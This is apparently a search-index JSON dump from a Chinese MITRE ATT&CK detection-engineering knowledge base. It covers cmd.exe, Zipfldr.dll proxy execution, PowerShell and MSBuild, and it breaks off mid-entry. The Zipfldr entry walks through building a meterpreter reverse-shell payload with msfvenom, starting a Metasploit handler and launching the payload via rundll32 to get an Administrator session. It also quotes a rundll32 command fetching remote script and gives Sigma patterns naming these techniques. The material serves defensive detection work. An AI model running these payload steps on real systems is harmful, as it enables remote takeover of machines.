<p>shttps://blog.csdn.net/weixin_30790841/article/details/101848854</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/","title":"T1059-windows-\u8fdb\u7a0b\u751f\u6210CMD","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u547d\u4ee4\u884c\u754c\u9762\u63d0\u4f9b\u4e86\u4e00\u79cd\u4e0e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea4\u4e92\u7684\u65b9\u5f0f\uff0c\u5e76\u4e14\u662f\u8bb8\u591a\u7c7b\u578b\u7684\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u5e38\u89c1\u529f\u80fd\u3002windows\u7cfb\u7edf\u4e0a\u7684\u4e00\u4e2a\u793a\u4f8b\u547d\u4ee4\u884c\u754c\u9762\u662fcmd\uff0c\u5b83\u53ef\u7528\u4e8e\u6267\u884c\u8bb8\u591a\u4efb\u52a1\uff0c\u5305\u62ec\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002\u53ef\u4ee5\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u5e94\u7528\u7a0b\u5e8f\u672c\u5730\u6216\u8fdc\u7a0b\u4ea4\u4e92\uff0c\u53cd\u5411shell\u4f1a\u8bdd\u7b49\u65b9\u5f0f\u8fd0\u884c\u547d\u4ee4\u884c\u754c\u9762\u3002\u6267\u884c\u7684\u547d\u4ee4\u4ee5\u547d\u4ee4\u884c\u754c\u9762\u8fdb\u7a0b\u7684\u5f53\u524d\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u9664\u975e\u8be5\u547d\u4ee4\u5305\u542b\u66f4\u6539\u6743\u9650\u4e0a\u4e0b\u6587\u7684\u8fdb\u7a0b\u8c03\u7528\u6267\u884c\uff08\u4f8b\u5982\u8ba1\u5212\u4efb\u52a1\uff09\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u5e76\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Windows \u547d\u4ee4\u63d0\u793a\u7b26\uff08<code>cmd.exe</code>\uff09\u662f\u4e00\u4e2a\u4e3aWindows\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u547d\u4ee4\u884c\u754c\u9762\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002\u5b83\u63d0\u4f9b\u4e86\u8fd0\u884c\u5176\u4ed6\u7a0b\u5e8f\u7684\u80fd\u529b\uff0c\u4e5f\u6709\u51e0\u4e2a\u5185\u7f6e\u547d\u4ee4\uff0c\u4f8b\u5982<code>dir</code>\uff0c<code>copy</code>\uff0c<code>mkdir</code>\uff0c\u548c<code>type</code>\uff0c\u4ee5\u53ca\u6279\u5904\u7406\u811a\u672c\uff08<code>.bat</code>\uff09\u3002\u901a\u5e38\uff0c\u5f53\u7528\u6237\u8fd0\u884c\u547d\u4ee4\u63d0\u793a\u7b26\u65f6\uff0c\u7236\u8fdb\u7a0b<code>explorer.exe</code>\u6216\u8be5\u63d0\u793a\u7684\u53e6\u4e00\u4e2a\u5b9e\u4f8b\u3002\u53ef\u80fd\u5b58\u5728\u81ea\u52a8\u7a0b\u5e8f\uff0c\u767b\u5f55\u811a\u672c\u6216\u7ba1\u7406\u5de5\u5177\uff0c\u7528\u4e8e\u542f\u52a8\u547d\u4ee4\u63d0\u793a\u7b26\u7684\u5b9e\u4f8b\u4ee5\u8fd0\u884c\u811a\u672c\u6216\u5176\u4ed6\u5185\u7f6e\u547d\u4ee4\u3002\u4ea7\u751f\u8fd9\u4e2a\u8fc7\u7a0b<code>cmd.exe</code>\u6765\u81ea\u67d0\u4e9b\u7236\u6bcd\u53ef\u80fd\u66f4\u80fd\u8bf4\u660e\u6076\u610f\u3002\u4f8b\u5982\uff0c\u5982\u679cAdobe Reader\u6216Outlook\u542f\u52a8\u547d\u4ee4shell\uff0c\u5219\u53ef\u80fd\u8868\u793a\u5df2\u52a0\u8f7d\u6076\u610f\u6587\u6863\u5e76\u5e94\u8fdb\u884c\u8c03\u67e5\u3002\u56e0\u6b64\uff0c\u901a\u8fc7\u5bfb\u627e\u5f02\u5e38\u7684\u7236\u8fdb\u7a0b<code>cmd.exe</code>\uff0c\u53ef\u4ee5\u68c0\u6d4b\u653b\u51fb\u8005\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>Windows 7</p> <p>\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u6216powershell\u4e2d\uff0c\u8fd0\u884ccmd.exe</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u5982\u679c\u4f60\u719f\u6089windows\u4e8b\u4ef6ID\u6216\u8005\u7ecf\u5e38\u7559\u610f\u4f60\u7684windows\u65e5\u5fd7\u7684\u8bdd\uff0c\u4f60\u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u770b\u5230\uff0c\u6bcf\u4e2a\u4e00\u4e2a\u8fdb\u7a0b\u7684\u521b\u5efa\uff0c\u7cfb\u7edf\u90fd\u4f1a\u8fdb\u884c\u8bb0\u5f55\u4ea7\u751f\u4e00\u4e2a\u4e8b\u4ef6\u3002\u6bd4\u5982windows\u7684\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6ID\u4e3a4688\uff0c\u8fdb\u7a0b\u5173\u95ed\u4e8b\u4ef6ID\u4e3a4689.\u5f53\u7136\u5728win7\u4e2d\uff0c\u4f60\u8fd8\u53ef\u4ee5\u770b\u5230\u8be6\u7ec6\u7684\u8fdb\u7a0b\u8def\u5f84\uff0c\u4f46\u662f\uff0c\u4f60\u6ca1\u6709\u529e\u6cd5\u770b\u5230\u7236\u8fdb\u7a0b\u662f\u4ec0\u4e48\uff1f\u6240\u4ee5\u4f60\u53ef\u80fd\u9700\u8981sysmon\u3002\u5728\u6700\u65b0\u7248\u672c\u7684windows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff08win10\uff09\u4e8b\u4ef6ID4688\u662f\u8bb0\u5f55\u4e86\u7236\u8fdb\u7a0b\u4e0e\u5b50\u8fdb\u7a0b\u7684\uff0c\u8fd9\u6709\u52a9\u4e8e\u66f4\u597d\u7684\u8fdb\u884c\u5a01\u80c1\u72e9\u730e\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#elk","title":"elk\u89c4\u5219","text":"<pre><code>process = search Process:Create\ncmd = filter process where (exe == \"cmd.exe\")\noutput cmd\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E8%BF%9B%E7%A8%8B%E7%94%9F%E6%88%90CMD/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1059</p> <p>https://attack.mitre.org/techniques/T1059/</p> <p>windows\u91cd\u70b9\u76d1\u63a7\u4e8b\u4ef6ID\u8868</p> <p>https://www.96007.club/2019/08/21/21/</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/","title":"T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355Zipfldr.dll\u6267\u884cPayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Rundll32.exe\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7rundll32.exe\u8fdb\u7a0b\u6267\u884c\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528rundll32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002</p> <p>Rundll32.exe\u53ef\u7528\u4e8e\u901a\u8fc7\u672a\u8bb0\u5f55\u7684shell32.dll\u51fd\u6570Control_RunDLL\u548c Control_RunDLLAsUser\u6765\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\u6587\u4ef6\uff08.cpl\uff09\u3002\u53cc\u51fb.cpl\u6587\u4ef6\u4e5f\u4f1a\u89e6\u53d1rundll32.exe\u6267\u884c\u3002</p> <p>Rundll32\u4e5f\u53ef\u7528\u4e8e\u6267\u884cJavaScript\u7b49\u811a\u672c\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8bed\u6cd5\u6765\u5b8c\u6210\uff1arundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" \u3002\u8fd9\u79cd\u65b9\u6cd5\u5df2\u88ab\u6076\u610f\u8f6f\u4ef6\u5982Poweliks\u6240\u4f7f\u7528\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>zipfldr.dll\u81eaWindows xp\u5f00\u59cb\u81ea\u5e26\u7684zip\u6587\u4ef6\u538b\u7f29/\u89e3\u538b\u5de5\u5177\u7ec4\u4ef6\uff0c\u540c\u6837\u8be5\u5de5\u5177\u652f\u6301WinXP-Win10 \u5168\u7248\u672c\uff0czipfldr.dll\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64zipfldr.dll\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u4f46\u7531\u4e8e\u4e3adll\u6587\u4ef6\uff0c\u9700\u8c03\u7528rundll32.exe\u6765\u6267\u884c\u3002</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p> <p>Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <p>C:\\Windows\\System32\\zipfldr.dll</p> <p>C:\\Windows\\SysWOW64\\zipfldr.dll</p> <p>Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <p>C:\\Windows\\System32\\zipfldr.dll</p> <p>C:\\Windows\\SysWOW64\\zipfldr.dll</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awindows server 2012</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#payloaddll","title":"\u751f\u6210payload.dll","text":"<pre><code>root@12306Br0:~# msfvenom -p windows/meterpreter/reverse_tcp -b '\\x00\\x0b' LHOST=192.168.126.146 LPORT=4444 -f exe &gt; shell.exe\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_6","title":"\u6267\u884c\u76d1\u542c","text":"<p>\u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b)</p> <pre><code>msf5 &gt; use exploits/multi/handler\nmsf5 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/handler) &gt; set lport 4444\nlport =&gt; 4444\nmsf5 exploit(multi/handler) &gt; set AutoRunScript migrate f\nAutoRunScript =&gt; migrate f\nmsf5 exploit(multi/handler) &gt; exploit\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#payload","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>rundll32.exe zipfldr.dll,RouteTheCall .\\shell.exe #shell.exe\u5b58\u653e\u8def\u5f84\u4e0b\u6267\u884c\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>msf5 exploit(multi/handler) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.126.146:4444\n[*] Sending stage (180291 bytes) to 192.168.126.156\n[*] Meterpreter session 6 opened (192.168.126.146:4444 -&gt; 192.168.126.156:49176) at 2020-04-13 10:54:22 +0800\n[*] Session ID 6 (192.168.126.146:4444 -&gt; 192.168.126.156:49176) processing AutoRunScript 'migrate f'\n[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.\n[!] Example: run post/windows/manage/migrate OPTION=value [...]\n\nmeterpreter &gt; getuid\nServer username: WIN-IFPMACUK8BT\\Administrator\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u5b89\u5168\u65e5\u5fd7\u80fd\u591f\u6e05\u6670\u7684\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u622a\u53d6windows\u5b89\u5168\u4e8b\u4ef64688\u8fdb\u7a0b\u521b\u5efa\u90e8\u5206\u5185\u5bb9\uff1a</p> <pre><code>\u8fdb\u7a0b\u4fe1\u606f: #4688-1\n\u65b0\u8fdb\u7a0b ID:0x918\n\u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\System32\\rundll32.exe\n\u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1)\n\u521b\u5efa\u8005\u8fdb\u7a0b ID:0x948\n\u8fdb\u7a0b\u547d\u4ee4\u884c:rundll32.exe  zipfldr.dll,RouteTheCall .\\shell.exe\n\n\u8fdb\u7a0b\u4fe1\u606f: #4688-2\n\u65b0\u8fdb\u7a0b ID:0x94c\n\u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Users\\Administrator\\Desktop\\a\\shell.exe\n\u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1)\n\u521b\u5efa\u8005\u8fdb\u7a0b ID:0x918\n\u8fdb\u7a0b\u547d\u4ee4\u884c:\"C:\\Users\\Administrator\\Desktop\\a\\shell.exe\"\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u53ef\u7591Rundll32\u6d3b\u52a8\ndescription: \u57fa\u4e8e\u53c2\u6570\u68c0\u6d4b\u4e0erundll32\u76f8\u5173\u7684\u53ef\u7591\u8fdb\u7a0b\nstatus: experimental\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1085\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*\\rundll32.exe* url.dll,*OpenURL *'\n            - '*\\rundll32.exe* url.dll,*OpenURLA *'\n            - '*\\rundll32.exe* url.dll,*FileProtocolHandler *'\n            - '*\\rundll32.exe* zipfldr.dll,*RouteTheCall *'\n            - '*\\rundll32.exe* Shell32.dll,*Control_RunDLL *'\n            - '*\\rundll32.exe javascript:*'\n            - '* url.dll,*OpenURL *'\n            - '* url.dll,*OpenURLA *'\n            - '* url.dll,*FileProtocolHandler *'\n            - '* zipfldr.dll,*RouteTheCall *'\n            - '* Shell32.dll,*Control_RunDLL *'\n            - '* javascript:*'\n            - '*.RegisterXLL*'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_9","title":"\u5efa\u8bae","text":"<p>\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1085-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Zipfldr.dll%E6%89%A7%E8%A1%8CPayload/#_10","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1085</p> <p>https://attack.mitre.org/techniques/T1085/</p> <p>\u57fa\u4e8e\u767d\u540d\u5355\u7684Payload</p> <p>https://blog.csdn.net/weixin_30790841/article/details/101848854</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/","title":"T1086-windows-powerhsell","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>PowerShell\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5305\u542b\u7684\u529f\u80fd\u5f3a\u5927\u7684\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u754c\u9762\u548c\u811a\u672c\u73af\u5883\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528PowerShell\u6267\u884c\u8bb8\u591a\u64cd\u4f5c\uff0c\u5305\u62ec\u53d1\u73b0\u4fe1\u606f\u548c\u6267\u884c\u4ee3\u7801\u3002</p> <p>PowerShell\u4e5f\u53ef\u4ee5\u7528\u4e8e\u4eceInternet\u4e0b\u8f7d\u5e76\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8fd9\u4e9b\u53ef\u6267\u884c\u6587\u4ef6\u53ef\u4ee5\u4ece\u78c1\u76d8\u6216\u5185\u5b58\u4e2d\u6267\u884c\u800c\u65e0\u9700\u63a5\u89e6\u78c1\u76d8\u3002</p> <p>\u4f7f\u7528PowerShell\u8fde\u63a5\u5230\u8fdc\u7a0b\u7cfb\u7edf\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002</p> <p>\u7f51\u7edc\u4e0a\u63d0\u4f9b\u4e86\u8bb8\u591a\u57fa\u4e8ePowerShell\u7684\u653b\u51fb\u6027\u6d4b\u8bd5\u5de5\u5177\uff0c\u5305\u62ecEmpire\uff0cPowerSploit\u548cPSAttack\u3002</p> <p>\u8fd8\u53ef\u4ee5\u6267\u884cPowerShell\u547d\u4ee4/\u811a\u672c\uff0c\u800c\u65e0\u9700\u901a\u8fc7.NET\u6846\u67b6\u548cWindows\u516c\u5171\u8bed\u8a00\u63a5\u53e3\u516c\u5f00\u7684PowerShell\u5e95\u5c42System.Management.Automation\u7a0b\u5e8f\u96c6\u7684\u63a5\u53e3\u76f4\u63a5\u8c03\u7528powershell.exe\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6a21\u62df\u573a\u666f\uff1a\u653b\u51fb\u8005\u901a\u8fc7\u5176\u89c6\u56fe\u7a97\u53e3\u6253\u5f00powershell</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7 \u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff0c\u4e8b\u4ef6ID4688</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: T1086  \u975e\u4ea4\u4e92\u5f0fPowerShell\ndescription: \u901a\u8fc7\u5c06powershell.exe\u4ee5explorer.exe\u4f5c\u4e3a\u7236\u7ea7\uff0c\u6765\u68c0\u6d4b\u975e\u4ea4\u4e92\u5f0fPowerShell\u6d3b\u52a8\u3002\nstatus: experimental\nauthor: 12306Bro\nreferences: \u65e0\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688\n        NewProcessName: '*\\powershell.exe'\n        ParentProcessName: '*\\explorer.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1086-win-powershell/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1086</p> <p>https://attack.mitre.org/techniques/T1086/</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/","title":"T1127-win-\u57fa\u4e8e\u767d\u540d\u5355Msbuild.exe\u6267\u884cpayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>MSBuild.exe\uff08Microsoft Build Engine\uff09\u662fVisual Studio\u4f7f\u7528\u7684\u8f6f\u4ef6\u6784\u5efa\u5e73\u53f0\u3002\u5b83\u91c7\u7528XML\u683c\u5f0f\u7684\u9879\u76ee\u6587\u4ef6\uff0c\u5b9a\u4e49\u4e86\u5404\u79cd\u5e73\u53f0\u7684\u6784\u5efa\u8981\u6c42\u548c\u914d\u7f6e\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528MSBuild\u901a\u8fc7\u53d7\u4fe1\u4efb\u7684Windows\u5b9e\u7528\u7a0b\u5e8f\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\u3002.NET 4\u4e2d\u5f15\u5165\u7684MSBuild\u5185\u8054\u4efb\u52a1\u529f\u80fd\u5141\u8bb8\u5c06C\uff03\u4ee3\u7801\u63d2\u5165\u5230XML\u9879\u76ee\u6587\u4ef6\u4e2d\u3002\u5185\u8054\u4efb\u52a1MSBuild\u5c06\u7f16\u8bd1\u5e76\u6267\u884c\u5185\u8054\u4efb\u52a1\u3002MSBuild.exe\u662f\u4e00\u4e2a\u7b7e\u540d\u7684\u5fae\u8f6f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u56e0\u6b64\u5f53\u5b83\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u4f7f\u7528\u65f6\uff0c\u5b83\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801\u5e76\u7ed5\u8fc7\u914d\u7f6e\u4e3a\u5141\u8bb8MSBuild.exe\u6267\u884c\u7684\u5e94\u7528\u767d\u540d\u5355\u9632\u5fa1\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1127-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95M